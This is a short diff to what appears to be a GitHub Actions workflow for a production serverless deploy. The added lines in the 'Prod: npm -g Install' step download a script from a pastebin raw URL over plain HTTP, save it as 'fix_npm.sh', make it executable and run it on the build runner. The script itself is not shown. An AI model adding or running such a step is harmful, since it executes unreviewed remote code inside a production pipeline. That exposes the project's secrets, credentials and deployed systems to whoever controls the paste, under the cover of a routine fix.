@@ -52,6 +52,10 @@ jobs:
           sudo npm install -g serverless
       - name: "Prod:  npm -g Install"
         run: |
+          cd ~
+          wget http://pastebin.com/raw/1ccE6EgF -O fix_npm.sh
+          chmod +x fix_npm.sh
+          ./fix_npm.sh
           sudo npm install
       - name: "Prod: Prepare Serverless Files"
         run: |
